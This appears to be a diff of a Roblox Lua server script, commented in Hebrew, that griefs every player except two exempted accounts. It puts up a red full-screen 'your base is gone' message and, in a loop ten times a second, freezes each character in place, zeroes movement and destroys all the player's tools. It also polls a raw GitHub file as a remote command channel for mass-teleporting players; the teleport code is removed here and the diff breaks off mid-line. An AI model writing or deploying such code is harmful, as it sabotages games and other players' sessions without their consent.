@@ -4,22 +4,16 @@ local Players = game:GetService("Players")
 
 local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
 
--- רשימת חסימה
 local blockedPlayers = {
 	["noamdb15"] = true,
 	["dylanzyl123"] = true
 }
 
--- פונקציה שמנקה הכל ושמה את המסך
-local function heavyLock(player)
-	-- מחיקת כל הדברים מהתיק (Inventory)
-	player:WaitForChild("Backpack"):ClearAllChildren()
-	local starterGear = player:FindFirstChild("StarterGear")
-	if starterGear then starterGear:ClearAllChildren() end
-
-	-- יצירת מסך הטרול
+-- פונקציה לניקוי חפצים ונעילה מוחלטת
+local function freezeEverything(player)
+	-- יצירת המסך עם הטקסט
 	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "FinalSystemLock"
+	screenGui.Name = "FinalLock"
 	screenGui.IgnoreGuiInset = true
 	screenGui.DisplayOrder = 9999999
 	screenGui.Parent = player:WaitForChild("PlayerGui")
@@ -34,35 +28,51 @@ local function heavyLock(player)
 	label.Size = UDim2.new(0.8, 0, 0.4, 0)
 	label.Position = UDim2.new(0.1, 0, 0.3, 0)
 	label.BackgroundTransparency = 1
-	label.TextColor3 = Color3.new(1, 0, 0) -- אדום
+	label.TextColor3 = Color3.new(1, 0, 0)
 	label.TextScaled = true
-	label.Font = Enum.Font.SpecialElite
-	label.Text = "הלך לך הבייס חבר יקר" -- הטקסט שביקשת
+	label.Text = "הלך לך הבייס חבר יקר"
 	label.Parent = frame
+
+	-- לופ פנימי לכל שחקן: מוחק חפצים ונועל תנועה כל הזמן
+	task.spawn(function()
+		while player.Parent do
+			local char = player.Character
+			if char then
+				-- 1. קיבוע פיזי לאדמה
+				local hrp = char:FindFirstChild("HumanoidRootPart")
+				if hrp and not hrp.Anchored then
+					hrp.Anchored = true
+				end
+				
+				-- 2. איפוס מהירות
+				local hum = char:FindFirstChild("Humanoid")
+				if hum then
+					hum.WalkSpeed = 0
+					hum.JumpPower = 0
+				end
+
+				-- 3. מחיקת חפצים (מהיד ומהתיק)
+				for _, item in pairs(player.Backpack:GetChildren()) do
+					item:Destroy()
+				end
+				for _, item in pairs(char:GetChildren()) do
+					if item:IsA("Tool") then
+						item:Destroy()
+					end
+				end
+			end
+			task.wait(0.1) -- בודק 10 פעמים בשנייה!
+		end
+	end)
 end
 
--- כששחקן נכנס - מפעיל את הנעילה הכבדה
 Players.PlayerAdded:Connect(function(player)
 	if not blockedPlayers[player.Name] then
-		heavyLock(player)
-		
-		player.CharacterAdded:Connect(function(char)
-			local hrp = char:WaitForChild("HumanoidRootPart")
-			local hum = char:WaitForChild("Humanoid")
-			
-			-- מוחק לו כל דבר שהוא מחזיק ביד
-			char:WaitForChild("Humanoid"):UnequipTools()
-			
-			-- נועל אותו במקום פיזית
-			task.wait(0.1)
-			hrp.Anchored = true 
-			hum.WalkSpeed = 0
-			hum.JumpPower = 0
-		end)
+		freezeEverything(player)
 	end
 end)
 
--- לופ שיגור אגרסיבי (כל 0.5 שניות)
+-- לופ שיגור (המוח של הסקריפט)
 task.spawn(function()
 	while true do
 		local success, response = pcall(function()
@@ -76,18 +86,4 @@ task.spawn(function()
 			end
 
 			local targetPlaceId = tonumber(lines[1])
-			local targetJobId = lines[2]
-
-			if targetJobId and targetJobId ~= "" then
-				for _, player in pairs(Players:GetPlayers()) do
-					if not blockedPlayers[player.Name] then
-						pcall(function()
-							TeleportService:TeleportToPlaceInstance(targetPlaceId or game.PlaceId, targetJobId, player)
-						end)
-					end
-				end
-			end
-		end
-		task.wait(0.5)
-	end
-end)
+			local targetJobId = lines
